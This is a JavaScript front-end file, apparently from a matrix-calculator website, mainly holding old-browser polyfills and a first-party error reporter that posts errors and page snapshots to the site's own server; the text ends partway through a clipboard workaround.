// Hello,
// Please, don't make a full clone of this application for wide publishing purposes.
// Some of the code is shared, some parts have their own license linked in the comments.
// If you need something, you may contact matri-tri-ca@yandex.ru.
// Have a nice day!

"use strict"; // It will be in the beginning of a mjs.js.
/*jslint sloppy: true, indent: 2 */
/*global XMLHttpRequest, window, Node */

(function (global) {
  "use strict";

  var encodeURIComponentSafe = function (string) {
    //return encodeURIComponent(string.replace(/[\u{D800}-\u{DFFF}]/gu, '\uFFFD'));
    return encodeURIComponent(string.replace(/([^\uD800-\uDBFF])[\uDC00-\uDFFF]/g, '$1\uFFFD').replace(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/g, '\uFFFD'));
  };

  var sent = {};
  global.onerror = function (message, filename, lineno, colno, error) {
    message = message || "";
    filename = filename || "";
    lineno = lineno || 0;
    colno = colno || 0;
    error = error || undefined;
    var stack = error != undefined ? error.stack || "" : "";
    var data = "message=" + encodeURIComponentSafe(message.toString()) + "&" +
               "filename=" + encodeURIComponentSafe(filename.toString()) + "&" +
               "lineno=" + encodeURIComponentSafe(lineno.toString()) + "&" +
               "colno=" + encodeURIComponentSafe(colno.toString()) + "&" +
               "stack=" + encodeURIComponentSafe(stack.toString());
    if (sent[data] == undefined && window.location.protocol !== "file:") {
      sent[data] = data;
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://matrixcalc.mcdir.ru/jserrors.php?error=1", true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send(data);
      if (error instanceof TypeError && lineno !== 1) {
        global.sendSnapshot();
      }
    }
  };

  var html2html = function (container) {
    var clone = container.cloneNode(true);
    var walk = function (node) {
      if (node.tagName.toLowerCase() === 'script' || node.tagName.toLowerCase() === 'iframe') {
        node.parentNode.removeChild(node);
      } else if (node.tagName.toLowerCase() === 'link') {
        if (node.getAttribute('rel') === 'stylesheet') {
          node.setAttribute('href', node.href); // set to an absolute URL
        } else {
          node.parentNode.removeChild(node);
        }
      } else if (node.tagName.toLowerCase() === 'input') {
        node.setAttribute('value', node.value);
      } else if (node.tagName.toLowerCase() === 'textarea') {
        node.textContent = node.value;
      }
      var next = node.firstElementChild;
      while (next != null) {
        var c = next;
        next = next.nextElementSibling; // as c could be removed
        walk(c);
      }
    };
    walk(clone);
    return new XMLSerializer().serializeToString(clone);
  };

  global.sendSnapshot = function () {
    if (global.document != undefined) {
      var activeElement = global.document.querySelector(":focus");
      if (activeElement != null) {
        activeElement.setAttribute("data-state", "focus");
        activeElement.setAttribute("autofocus", "autofocus"); // as huge snapshot may be truncated and style can be cutted out
      }
      var snapshot = html2html(global.document.documentElement);
      if (activeElement != null) {
        activeElement.removeAttribute("data-state");
        activeElement.removeAttribute("autofocus");
      }
      snapshot += "<style>[data-state=\"focus\"] { outline: 2px solid green; } </style>";
      var dataURL = "data:text/html;charset=utf-8," + snapshot.replace(/%/g, '%25').replace(/#/g, '%23');
      global.onerror(dataURL, "snapshot.js", 0, 0, undefined);
    }
  };

}(self));

/*global self*/

(function () { // to avoid global variables
"use strict";

  // Firefox < 4, Opera < 11.60, IE 8
  if (Object.create == undefined) {
    Object.create = function (prototype) {
      var F = function () {
      };
      F.prototype = prototype;
      return new F();
    };
  }

  // Opera 12
  if ((-2147483649).toString(16) === "-0" && (2147483649).toString(16) === "80000001") {
    var numberToString = Number.prototype.toString;
    Number.prototype.toString = function (radix) {
      "use strict";
      var value = 0 + this;
      return (value < 0 ? "-" : "") + numberToString.call(value < 0 ? 0 - value : value, radix);
    };
  }

  if (Object.assign == undefined) {
    Object.assign = function (target) {
      for (var i = 1; i < arguments.length; i += 1) {
        var source = arguments[i];
        if (source != undefined) {
          for (var key in source) {
            if (Object.prototype.hasOwnProperty.call(source, key)) {
              target[key] = source[key];
            }
          }
        }
      }
      return target;
    };
  }

  if (Object.getOwnPropertyDescriptor == undefined && Object.prototype.__lookupGetter__ != undefined && Object.prototype.__lookupSetter__ != undefined) {
    Object.getOwnPropertyDescriptor = function (object, property) {
      if (Object.prototype.hasOwnProperty.call(object, property)) {
        var getter = object.__lookupGetter__(property); // not working well if to call through Function#call in Firefox 3.6 (?)
        var setter = object.__lookupSetter__(property);
        if (getter != undefined || setter != undefined) {
          return {
            get: getter,
            set: setter,
            enumerable: false,
            configurable: true
          };
        }
        return {
          value: object[property],
          writable: true,
          enumerable: true,
          configurable: true
        };
      }
      return undefined;
    };
  }

  // https://stackoverflow.com/a/15851520
  if (Object.getPrototypeOf == undefined) {
    Object.getPrototypeOf = function (object) {
      return object.__proto__ || object.constructor.prototype;
    };
  }

  if (String.prototype.trim == undefined) {
    String.prototype.trim = function () {
      "use strict";
      return String(this).replace(/^\s+|\s+$/g, '');
    };
  }

  if (String.prototype.repeat == undefined) {
    String.prototype.repeat = function (count) {
      "use strict";
      if (count < 0 || count % 1 !== 0 || count > 9007199254740991) {
        throw new TypeError();
      }
      var x = String(this);
      var accumulator = "";
      while (count > 0) {
        if (count % 2 === 1) {
          count -= 1;
          accumulator += x;
        } else {
          x += x;
          count /= 2;
        }
      }
      return accumulator;
    };
  }

  if (String.prototype.codePointAt == undefined) {
    String.prototype.codePointAt = function (index) {
      "use strict";
      var string = String(this);
      // https://github.com/mathiasbynens/String.prototype.codePointAt/blob/master/implementation.js
      // Get the first code unit
      var first = string.charCodeAt(index);
      if ( // check if itâ€™s the start of a surrogate pair
        first >= 0xD800 && first <= 0xDBFF && // high surrogate
        string.length > index + 1 // there is a next code unit
      ) {
        var second = string.charCodeAt(index + 1);
        if (second >= 0xDC00 && second <= 0xDFFF) { // low surrogate
          // https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
          return (first - 0xD800) * 0x400 + second - 0xDC00 + 0x10000;
        }
      }
      return first;
    };
  }

  if (String.fromCodePoint == undefined) {
    String.fromCodePoint = function (codePoint) {
      if (arguments.length === 1) {
        codePoint = Math.floor(Number(codePoint));
        if (!(codePoint >= 0 && codePoint <= 0x10FFFF)) {
          throw new RangeError("Invalid code point: " + codePoint);
        }
        if (codePoint <= 0xFFFF) {
          return String.fromCharCode(codePoint);
        }
        return String.fromCharCode(((codePoint - 0x10000) >> 10) + 0xD800) +
               String.fromCharCode((codePoint - 0x10000) % 1024 + 0xDC00);
      }
      var s = '';
      for (var i = 0; i < arguments.length; i += 1) {
        s += String.fromCodePoint(arguments[i]);
      }
      return s;
    };
  }

  // https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/endsWith#Polyfill
  if (!String.prototype.endsWith) {
    String.prototype.endsWith = function(search, this_len) {
      if (this_len === undefined || this_len > this.length) {
        this_len = this.length;
      }
      return this.substring(this_len - search.length, this_len) === search;
    };
  }

  // https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/startsWith#Polyfill
  if (!String.prototype.startsWith) {
      String.prototype.startsWith = function(search, rawPos) {
          var pos = rawPos > 0 ? rawPos|0 : 0;
          return this.substring(pos, pos + search.length) === search;
      };
  }

  if (Array.prototype.map == undefined) {
    Array.prototype.map = function (f) {
      var x = new Array(this.length);
      for (var i = 0; i < this.length; i += 1) {
        x[i] = f(this[i], i);
      }
      return x;
    };
  }
  
  if (Array.prototype.filter == undefined) {
    Array.prototype.filter = function (f) {
      var x = [];
      for (var i = 0; i < this.length; i += 1) {
        var e = this[i];
        if (f(e, i)) {
          x.push(e);
        }
      }
      return x;
    };
  }

  if (Array.prototype.fill == undefined) {
    Array.prototype.fill = function (value, start, end) {
      var array = this;
      start = start || 0;
      if (start < 0) {
        start += array.length;
      }
      end = end == undefined ? array.length : end;
      if (end < 0) {
        end += array.length;
      }
      for (var i = start; i < end; i += 1) {
        array[i] = value;
      }
      return array;
    };
  }

  if (Array.prototype.reduce == undefined) {
    Array.prototype.reduce = function (callback, acc) {
      var i = 0;
      if (acc == undefined) {
        acc = this[0];
        i += 1;
      }
      for (; i < this.length; i++) {
        acc = callback(acc, this[i], i, this);
      }
      return acc;
    };
  }

  // IE < 9, Firefox < 4, Opera < 11.60
  if (Function.prototype.bind == undefined) {
    Function.prototype.bind = function (context) {
      var f = this;
      if (arguments.length === 1) {
        return function () {
          if (arguments.length === 0) {
            return f.call(context);
          }
          return f.apply(context, arguments);
        };
      } else {
        var args = Array.prototype.slice.call(arguments, 1);
        return function () {
          return f.apply(context, args.concat(Array.prototype.slice.call(arguments)));
        };
      }
    };
  }

  // IE < 9, Opera < 10.50
  if (Date.now == undefined) {
    Date.now = function () {
      return new Date().getTime();
    };
  }

  // Firefox < 4, Opera < 11.60
  if (Object.defineProperty == undefined && Object.prototype.__defineGetter__ != undefined && Object.prototype.__defineSetter__ != undefined) {
    Object.defineProperty = function (object, property, descriptor) {
      var getter = descriptor.get;
      if (getter != undefined) {
        object.__defineGetter__(property, getter);
      }
      var setter = descriptor.set;
      if (setter != undefined) {
        object.__defineSetter__(property, setter);
      }
    };
  }

  if (Number.parseFloat == undefined) {
    Number.parseFloat = parseFloat;
  }

  if (Number.isNaN == undefined) {
    Number.isNaN = function (x) {
      return typeof x === "number" && 0 + x !== 0 + x;
    };
  }

  if (Math.cbrt == undefined || Math.cbrt(64) !== 4) {
    Math.cbrt = function (x) {
      x = Number(x);
      // http://en.wikipedia.org/wiki/Cube_root#Numerical_methods
      if (x !== x || x === 0 || x === -1 / 0 || x === +1 / 0) {
        return x;
      }
      var a = Math.abs(x);
      var y0 = Math.exp(Math.log(a) / 3);
      return (x / a) * (y0 + (a / (y0 * y0) - y0) / 3);
    };
  }

  if (Math.log2 == undefined) {
    Math.log2 = function (x) {
      return Math.log(x) * Math.LOG2E;
    };
  }

  if (Math.log10 == undefined) {
    Math.log10 = function (x) {
      return Math.log(x) * Math.LOG10E;
    };
  }

  if (!Math.clz32) Math.clz32 = function(x) {
    x = x >>> 0;
    return x === 0 ? 32 : 31 - Math.floor(Math.log(x + 0.5) * Math.LOG2E);
  };

  if (!Math.sign) Math.sign = function (x) {
    return x < 0 ? -1 : (x > 0 ? +1 : x);
  };

// Firefox < 3.5, ...
if (self.JSON == undefined) {
  self.JSON = {
    parse: function (x) {
      return eval("(" + x + ")");
    },
    stringify: function (x) {
      var quote = function (string) {
        return "\"" + string.replace(/[\x00-\x1f\\"]/g, function (character) {
          return "\\u" + (0x10000 + character.charCodeAt(0)).toString(16).slice(1);
        }) + "\"";
      };
      if (typeof x === "object") {
        if (typeof x.toJSON === "function") {
          return quote(x.toJSON().toString());
        }
        var isArray = x.length != undefined;
        var f = false;
        var s = "";
        s += isArray ? "[" : "{";
        for (var i in x) {
          if (Object.prototype.hasOwnProperty.call(x, i)) {
            var v = x[i];
            if (v != undefined) {
              if (f) {
                s += ",";
              }
              f = true;
              s += (isArray ? "" : quote(i) + ":") + JSON.stringify(v);
            }
          }
        }
        s += isArray ? "]" : "}";
        return s;
      }
      if (typeof x === "number" || typeof x === "boolean") {
        return x.toString();
      }
      return x == undefined ? "null" : quote(x.toString());
    }
  };
}

if (!("globalThis" in self)) {
  self.globalThis = self;
}

if (globalThis.Symbol == null) {
  globalThis.Symbol = {};
  globalThis.Symbol.iterator = '@@iterator';
  Array.prototype[globalThis.Symbol.iterator] = function () {
    return this.values();
  };
}

if (Array.from == undefined) {
  Array.from = function (iterable, mapFn) {
    if (typeof iterable.next !== "function") { // this is wrong: instead it shoud text the Symbol.iterable
      var arrayLike = iterable;
      var result = new Array(arrayLike.length);
      for (var i = 0; i < arrayLike.length; i += 1) {
        result[i] = mapFn != undefined ? mapFn(arrayLike[i], i) : arrayLike[i];
      }
      return result;
    }
    var result = [];
    for (var i = iterable, x = i.next().value; x != undefined; x = i.next().value) {
      result.push(mapFn != undefined ? mapFn(x, result.length) : x);
    }
    return result;
  };
}

if (Array.prototype.values == undefined) {
  Array.prototype.values = function () {
    var array = this;
    var i = -1;
    var result = {
      value: undefined,
      done: false
    };
    return {
      next: function () {
        i += 1;
        result.value = i < array.length ? array[i] : undefined;
        result.done = i >= array.length;
        return result;
      }
    };
  };
}

if (Array.prototype.indexOf == undefined) {
  Array.prototype.indexOf = function (valueToFind, fromIndex) {
    for (var i = ((fromIndex || 0) + this.length) % this.length; i < this.length; i += 1) {
      if (this[i] === valueToFind) {
        return i;
      }
    }
    return -1;
  };
}

if (Array.prototype.includes == undefined) {
  Array.prototype.includes = function (valueToFind, fromIndex) {
    return this.indexOf(valueToFind, fromIndex) !== -1;
  };
}

// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#Alternatives
if (Array.prototype.flat == undefined) {
  // to enable deep level flatten use recursion with reduce and concat
  var flatDeep = function (arr, d) {
     return d > 0 ? arr.reduce(function (acc, val) { return acc.concat(Array.isArray(val) ? flatDeep(val, d - 1) : val); }, [])
                  : arr.slice();
  };
  Array.prototype.flat = function (depth) {
    return flatDeep(this, depth == undefined ? 1 : depth);
  };
}

if (Object.freeze == undefined) {
  Object.freeze = function (x) {
    return x;
  };
  Object.seal = function (x) {
    return x;
  };
  Object.preventExtensions = function (x) {
    return x;
  };
}

try {
  Object.freeze(undefined);
} catch (error) {
  var wrap = function (nativeFunction) {
    return function (x) {
      return typeof x !== "object" ? x : nativeFunction(x);
    };
  };
  Object.freeze = wrap(Object.freeze);
  Object.seal = wrap(Object.seal);
  Object.preventExtensions = wrap(Object.preventExtensions);
}

//Note: Number#toLocaleString is slow, same bugs are not fixed for native Intl.NumberFormat
if ((1).toLocaleString() === '1.00' ||
    (1).toLocaleString() === '1,00' ||
    (9007199254740991).toLocaleString().slice(-1).localeCompare('0') === 0) { // IE 8 or IE 11 or Edge 17, Safari < 11 ?, Chrome < ?
  Number.prototype.toLocaleString = function () {
    "use strict";
    return Number(this).toString();
  };
}

if (Number.MAX_SAFE_INTEGER == undefined) {
  Number.MAX_SAFE_INTEGER = 9007199254740991;
}

if (String.prototype.replaceAll == undefined) {
  (function () {
    var replaceAllCache = Object.create(null);
    var cacheSize = 0;
    function getRegExp(source) {
      var escapeRegExp = function (source) {
        // "-" is not escaped
        return source.replace(/[\/\\^$*+?.()|[\]{}]/g, '\\$&');
      };
      var value = replaceAllCache[source];
      if (value == undefined) {
        value = new RegExp(escapeRegExp(source), 'g');
        if (cacheSize === 1000) {
          for (var i in replaceAllCache) {
            if (Object.prototype.hasOwnProperty.call(replaceAllCache, i)) {
              delete cacheSize[i];
            }
          }
        }
        replaceAllCache[source] = value;
        cacheSize += 1;
      }
      return value;
    }
    String.prototype.replaceAll = function (a, b) {
      "use strict";
      return String(this).replace(typeof a === "string" ? getRegExp(a) : a, b);
    };
  }());
}

function hasUnicodePropertyEscapes() {
  try {
    return new RegExp('\\p{Decimal_Number}', 'u').test('0');
  } catch (error) {
  }
  return false;
}

if (!hasUnicodePropertyEscapes()) {
  var dnre = /(?:[0-9\u0660-\u0669\u06F0-\u06F9\u07C0-\u07C9\u0966-\u096F\u09E6-\u09EF\u0A66-\u0A6F\u0AE6-\u0AEF\u0B66-\u0B6F\u0BE6-\u0BEF\u0C66-\u0C6F\u0CE6-\u0CEF\u0D66-\u0D6F\u0DE6-\u0DEF\u0E50-\u0E59\u0ED0-\u0ED9\u0F20-\u0F29\u1040-\u1049\u1090-\u1099\u17E0-\u17E9\u1810-\u1819\u1946-\u194F\u19D0-\u19D9\u1A80-\u1A89\u1A90-\u1A99\u1B50-\u1B59\u1BB0-\u1BB9\u1C40-\u1C49\u1C50-\u1C59\uA620-\uA629\uA8D0-\uA8D9\uA900-\uA909\uA9D0-\uA9D9\uA9F0-\uA9F9\uAA50-\uAA59\uABF0-\uABF9\uFF10-\uFF19]|\uD801[\uDCA0-\uDCA9]|\uD803[\uDD30-\uDD39]|\uD804[\uDC66-\uDC6F\uDCF0-\uDCF9\uDD36-\uDD3F\uDDD0-\uDDD9\uDEF0-\uDEF9]|\uD805[\uDC50-\uDC59\uDCD0-\uDCD9\uDE50-\uDE59\uDEC0-\uDEC9\uDF30-\uDF39]|\uD806[\uDCE0-\uDCE9\uDD50-\uDD59]|\uD807[\uDC50-\uDC59\uDD50-\uDD59\uDDA0-\uDDA9]|\uD81A[\uDE60-\uDE69\uDEC0-\uDEC9\uDF50-\uDF59]|\uD835[\uDFCE-\uDFFF]|\uD838[\uDD40-\uDD49\uDEF0-\uDEF9]|\uD83A[\uDD50-\uDD59]|\uD83E[\uDFF0-\uDFF9])/;
  //hasUnicodePropertyEscapes() ?  : dnre
  var NativeRegExp = globalThis.RegExp;
  globalThis.RegExp = function (source, flags) {
    if (source === "\\p{Decimal_Number}" && flags === "u") {
      source = dnre.source;
      flags = "";
    }
    return new NativeRegExp(source, flags);
  };
  globalThis.RegExp.prototype = NativeRegExp.prototype;
}


}());


if (Object.keys == undefined) {
  Object.keys = function (object) {
    "use strict";
    var keys = [];
    for (var name in object) {
      if (Object.prototype.hasOwnProperty.call(object, name)) {
        keys.push(name);
      }
    }
    return keys;
  };
}


(function (global) {
  "use strict";

  function MapEntry(key, value) {
    this.key = key;
    this.value = value;
    this.nextEntry = undefined;
    this.next = undefined;
    this.previous = undefined;
  }

  function Map() {
    this.data = {};
    this.size = 0;
    this.sentinel = new MapEntry(undefined, undefined);
    this.sentinel.next = this.sentinel;
    this.sentinel.previous = this.sentinel;
  }

  Map.getKey = function (key) {
    return typeof key === "number" || typeof key === "string" ? key.toString() : "";
  };

  Map.prototype.forEach = function (callback, thisArg) {
    var node = this.sentinel.next;
    while (node !== this.sentinel) {
      callback.call(thisArg, node.value, node.key, this);
      while (node !== this.sentinel && node.next == undefined) {
        node = node.previous;
      }
      node = node.next;
    }
  };

  Map.prototype.clear = function () {
    var node = this.sentinel;
    while (node !== this.sentinel) {
      delete this.data[Map.getKey(node.key)];
      var tmp = node.next;
      node.next = undefined;
      node.previous = this.sentinel;
      node = tmp;
    }
    this.size = 0;
  };

  Map.prototype.get = function (key) {
    var k = Map.getKey(key);
    var entry = this.data[k];
    while (entry != undefined) {
      if (entry.key === key) {
        return entry.value;
      }
      entry = entry.nextEntry;
    }
    return undefined;
  };

  Map.prototype.has = function (key) {
    var k = Map.getKey(key);
    var entry = this.data[k];
    while (entry != undefined) {
      if (entry.key === key) {
        return true;
      }
      entry = entry.nextEntry;
    }
    return false;
  };

  Map.prototype.set = function (key, value) {
    var k = Map.getKey(key);
    var entry = this.data[k];
    var newEntry = new MapEntry(key, value);
    newEntry.previous = this.sentinel.previous;
    newEntry.next = this.sentinel;
    this.data[k] = newEntry;
    var previousEntry = newEntry;
    var size = this.size + 1;
    while (entry != undefined) {
      if (entry.key !== key) {
        previousEntry.nextEntry = entry;
        previousEntry = entry;
      } else {
        size -= 1;
        newEntry.previous = entry.previous;
        newEntry.next = entry.next;
        entry.next = undefined;
      }
      entry = entry.nextEntry;
    }
    newEntry.previous.next = newEntry;
    newEntry.next.previous = newEntry;
    this.size = size;
  };

  Map.prototype["delete"] = function (key) {
    var k = Map.getKey(key);
    var entry = this.data[k];
    delete this.data[k];
    var previousEntry = undefined;
    var size = this.size;
    while (entry != undefined) {
      if (entry.key !== key) {
        if (previousEntry == undefined) {
          this.data[k] = entry;
        } else {
          previousEntry.nextEntry = entry;
        }
        previousEntry = entry;
      } else {
        size -= 1;
        entry.previous.next = entry.next;
        entry.next.previous = entry.previous;
        entry.next = undefined;
      }
      entry = entry.nextEntry;
    }
    this.size = size;
  };

  if (global.Map == undefined) {
    global.Map = Map;
  }

}(this));

/*global document, window, Element, Event, Node, HTMLElement, DOMTokenList, Document, DocumentFragment, HTMLInputElement, HTMLTextAreaElement, TextRange, DOMParser, Window, Image, CSSRule */

(function () { // to avoid global variables
"use strict";

// IE < 9, Firefox < 3.5
if (!("firstElementChild" in document.documentElement)) {
  (function () {
    function f(property0, property1, property2) {
      if (!(property0 in document.documentElement)) {
        Object.defineProperty(Element.prototype, property0, {
          get: function () {
            var t = this[property1];
            while (t != undefined && t.nodeType !== Node.ELEMENT_NODE) {
              t = t[property2];
            }
            return t;
          }
        });
      }
    }
    f("previousElementSibling", "previousSibling", "previousSibling");
    f("nextElementSibling", "nextSibling", "nextSibling");
    f("firstElementChild", "firstChild", "nextSibling");
    f("lastElementChild", "lastChild", "previousSibling");
  }());
}


// IE 11, Edge < 17, Chrome < 29, Firefox < 25, Safari < 9
var tmpFragment = document.createDocumentFragment();
if (!("firstElementChild" in tmpFragment) ||
    !("lastElementChild" in tmpFragment)) {
  (function () {
    function f(property0, property1, property2) {
      Object.defineProperty(DocumentFragment.prototype, property0, {
        get: function () {
          var t = this[property1];
          while (t != undefined && t.nodeType !== Node.ELEMENT_NODE) {
            t = t[property2];
          }
          return t;
        }
      });
    }
    f("firstElementChild", "firstChild", "nextSibling");
    f("lastElementChild", "lastChild", "previousSibling");
  }());
}


// Firefox < 3.5
if (Element.prototype.querySelectorAll == undefined) {
  if (Element.prototype.matches == undefined) {
    Element.prototype.matches = function (selector) {
      if (selector === "*") {
        return true;
      }
      var selectorRegExp = /^([a-zA-Z\-]+)?(\.[a-zA-Z\-]+)?(?:\[([a-zA-Z\-]+)(?:\="?([a-zA-Z\{\}\(\)\|#]+)"?)?\])?$/;
      var tmp = selectorRegExp.exec(selector);
      if (tmp == null) {
        throw new TypeError("Unsupported selector: " + selector);
      }
      var tagName = null;
      var className = null;
      var attributeName = null;
      var attributeValue = null;
      if (tmp[1] != null) {
        tagName = tmp[1].toLowerCase();//!
      }
      if (tmp[2] != null) {
        className = tmp[2].slice(1);
      }
      if (tmp[3] != null) {
        attributeName = tmp[3];
      }
      if (tmp[4] != null) {
        attributeValue = tmp[4];
      }
      return (tagName == null || this.tagName.toLowerCase() === tagName) &&
             (className == null || this.classList.contains(className)) &&
             (attributeName == null || this.getAttribute(attributeName) != null) &&
             (attributeValue == null || this.getAttribute(attributeName) === attributeValue);
    };
  }
  Element.prototype.querySelectorAll = function (selector) {
    var results = [];
    var traverse = function (x) {
      // https://en.wikipedia.org/wiki/Tree_traversal#Pre-order_(NLR)
      if (x.matches(selector)) {
        results.push(x);
      }
      var c = x.firstElementChild;
      while (c != null) {
        traverse(c);
        c = c.nextElementSibling;
      }
    };
    traverse(this);
    return results;
  };
}
if (Element.prototype.querySelector == undefined) {
  Element.prototype.querySelector = function (s) {
    var x = this.querySelectorAll(s);
    return x.length === 0 ? undefined : x[0];
  };
}
if (Document.prototype.querySelectorAll == undefined) {
  Document.prototype.querySelectorAll = function (s) {
    return this.documentElement.querySelectorAll(s);
  };
}
if (Document.prototype.querySelector == undefined) {
  Document.prototype.querySelector = function (s) {
    return this.documentElement.querySelector(s);
  };
}


// in Opera 12 a getter on Element.prototype somehow handles the access to html elements
if (!('classList' in HTMLElement.prototype) && Object.getOwnPropertyDescriptor(document.documentElement, 'classList') != null) {
	Object.defineProperty(HTMLElement.prototype, 'classList', Object.getOwnPropertyDescriptor(document.documentElement, 'classList'));
}

// HTMLELement#classList for (IE 8 - IE 9, Konqueror 4.13, Firefox < 3.6, Opera < 11.60)
// Object.defineProperty with DOM

if (!('classList' in Element.prototype)) {
  (function () {
    var update = function (cl) {
      for (var i = 0; i < cl.tokens.length; i += 1) {
        cl[i] = cl.tokens[i];
      }
      for (var j = cl.tokens.length; j < cl.length; j += 1) {
        cl[j] = null;
      }
      cl.length = cl.tokens.length;
    };

    function ClassList(element) {
      this.element = element;
      // Element#className is not supported on MathML elements in older browsers
      // Element#className is overriden for svg elements
      var s = (element.getAttribute('class') || '').replace(/^\s+|\s+$/g, '').replace(/\s+/g, ' ');
      this.tokens = s === '' ? [] : s.split(' ');
      this.length = 0;
      update(this);
    }

    //ClassList.prototype.item = function (index) {
    //  return index < this.tokens.length ? this.tokens[index] : null;
    //};
    ClassList.prototype.contains = function (className) {
      for (var i = 0; i < this.tokens.length; i += 1) {
        if (this.tokens[i] === className) {
          return true;
        }
      }
      return false;
    };
    ClassList.prototype.add = function (className) {
      for (var j = 0; j < this.tokens.length; j += 1) {
        if (this.tokens[j] === className) {
          return;
        }
      }
      this.tokens.push(className);
      update(this);
      this.element.setAttribute('class', this.tokens.join(' '));
    };
    ClassList.prototype.remove = function (className) {
      var k = 0;
      for (var i = 0; i < this.tokens.length; i += 1) {
        if (this.tokens[i] !== className) {
          this.tokens[k] = this.tokens[i];
          k += 1;
        }
      }
      if (k === this.tokens.length) {
        return;
      }
      this.tokens.length = k;
      update(this);
      this.element.setAttribute('class', this.tokens.join(' '));
    };
    ClassList.prototype.toggle = function (className, force) {
      force = force == undefined ? !this.contains(className) : force;
      if (force) {
        this.add(className);
      } else {
        this.remove(className);
      }
      return force;
    };
    ClassList.prototype.toString = function () {
      return this.tokens.join(' ');
    };

    if (!('classList' in document.documentElement)) {
      Object.defineProperty(HTMLElement.prototype, 'classList', {
        get: function () {
          return new ClassList(this);
        }
      });
      window.DOMTokenList = ClassList;
    }

    /*
    if (!('className' in Element.prototype) && document.createElementNS('http://www.w3.org/1998/Math/MathML', 'math').className == null) {
      Object.defineProperty(Element.prototype, 'className', {
        get: function () {
          return this.getAttribute('class') || '';
        },
        set: function (value) {
          this.setAttribute('class', value);
        }
      });
    }
    */

    // IE 11
    //TODO: mrow.far
    //TODO: !
    Object.defineProperty(Element.prototype, 'classList', {
      get: function () {
        return new ClassList(this);
      }
    });

  }());
}

// IE 10 - IE 11, Opera 11.50 - Opera 12.18, Firefox < 24, Chrome < 24, Safari < 7
if (document.documentElement.classList.toggle('test', false)) {
  DOMTokenList.prototype.toggle = function (token, force) {
    force = force == undefined ? !this.contains(token) : force;
    if (force) {
      this.add(token);
    } else {
      this.remove(token);
    }
    return force;
  };
}


// IE 8 - IE 9 Drag and Drop helper
if (window.XDomainRequest != undefined && !("draggable" in document.documentElement)) {
  document.addEventListener("selectstart", function (event) {
    if (!event.altKey) {
      var target = event.target;
      while (target != null && !(target.nodeType === Node.ELEMENT_NODE && target.getAttribute("draggable") != null)) {
        target = target.parentNode;
      }
      if (target != null && target.getAttribute("draggable") === "true") {
        event.preventDefault();
        target.dragDrop();
      }
    }
  }, false);
  //TODO:
  //document.documentElement.draggable = undefined; //Note: this will add the attribute "draggable" too in IE 8
}

// IE 8 does not support input event
// IE 9 does not fire input event sometimes
// Opera 12 does not fire input event after Drag and Drop (dragend)
// Opera 12 also does not fire input event when using "Undo" from the contextmenu
// Firefox 3.5 does not fire input event when drag and dropping text into an <input> element or a <textarea> element (see https://caniuse.com/input-event )
if (window.XDomainRequest != undefined || window.opera != undefined || window.FileReader == undefined) {
  (function () {
    document.addEventListener("input", function (event) {
      event.target.setAttribute("data-last-value", event.target.value);
    }, false);

    var fire = function (type, element) {
      window.setTimeout(function () {
        var event = document.createEvent("Event");
        event.initEvent(type, true, false);
        element.dispatchEvent(event);
      }, 0);
    };

    var check = function (elements) {
      for (var i = 0; i < elements.length; i += 1) {
        var e = elements[i];
        var lastValue = e.getAttribute("data-last-value");
        var value = String(e.value);
        if (lastValue !== value) {
          fire("input", e);
        }
      }
    };

    var inputs = document.getElementsByTagName("input");
    var textareas = document.getElementsByTagName("textarea");

    var checkElements = function (event) {
      window.setTimeout(function () {
        check(inputs);
        check(textareas);
      }, 0);
    };

    var inputEvents = ["keydown", "keyup", "cut", "paste", "dragend", "drop", "mouseleave"];
    // "mouseleave" is for Opera 12 Undo from Context Menu
    for (var i = 0; i < inputEvents.length; i++) {
      document.addEventListener(inputEvents[i], checkElements, false);
    }

    //var checkInputs = function () {
    //  check(inputs);
    //  check(textareas);
    //  window.setTimeout(checkInputs, 300);
    //};

    //window.setTimeout(checkInputs, 300);
  }());
}


// Chrome < 30, Firefox < 10, Safari < 7
if (!("onmouseenter" in document.documentElement)) {
  document.addEventListener("mouseover", function (event) {
    if (!event.target.contains(event.relatedTarget)) {
      var e = document.createEvent("MouseEvent");
      e.initMouseEvent("mouseenter", false, false, event.view, event.detail,  event.screenX, event.screenY, event.clientX, event.clientY, event.ctrlKey, event.altKey, event.shiftKey, event.metaKey, event.button, event.relatedTarget);
      event.target.dispatchEvent(e);
    }
  }, false);
  document.documentElement.onmouseenter = undefined;
}

// Chrome < 30, Firefox < 10, Safari < 7
if (!("onmouseleave" in document.documentElement)) {
  document.addEventListener("mouseout", function (event) {
    if (!event.target.contains(event.relatedTarget)) {
      var e = document.createEvent("MouseEvent");
      e.initMouseEvent("mouseleave", false, false, event.view, event.detail,  event.screenX, event.screenY, event.clientX, event.clientY, event.ctrlKey, event.altKey, event.shiftKey, event.metaKey, event.button, event.relatedTarget);
      event.target.dispatchEvent(e);
    }
  }, false);
  document.documentElement.onmouseleave = undefined;
}

// Firefox < 6, Opera 10, Chrome < 18
if (!("defaultPrevented" in Event.prototype) && !("defaultPrevented" in document.createEvent("Event"))) {
  var preventDefault = Event.prototype.preventDefault;
  Event.prototype.preventDefault = function () {
    this.defaultPrevented = true;
    preventDefault.call(this);
  };
}

// IE 8 - IE 11 (not Edge)
if (window.clipboardData != undefined) {
  Object.defineProperty(Event.prototype, "clipboardData", {
    get: function () {
      return window.clipboardData;
    }
  });
}

// IE 8 - IE 11, Edge < 17
// see notes at http://caniuse.com/#feat=clipboard
// only for IE? (Safari < 10 does not support `document.execCommand('copy')`, but works fine with `Ctrl+C`)
if (!("oncopy" in document)) {
  window.setTimeout(function () {
    var removeCopyFix = function () {
      var copyFix = document.getElementById("copy-fix");
      if (copyFix != undefined) {
        copyFix.parentNode.removeChild(copyFix);
      }
    };

    var addCopyFix = function () {
      var activeElement = document.activeElement;
      if (activeElement == undefined || activeElement.tagName.toLowerCase() !== 'input' && activeElement.tagName.toLowerCase() !== 'textarea') {
        var selection = window.getSelection();
        if (selection.isCollapsed) {
          var copyFix = document.createElement("div");
          copyFix.id = "copy-fix";
          copyFix.innerHTML = "&nbsp;";
          document.body.appendChild(copyFix);
          var focusedNode = document.activeElement; // IE 11
          selection.collapse(copyFix, 0);
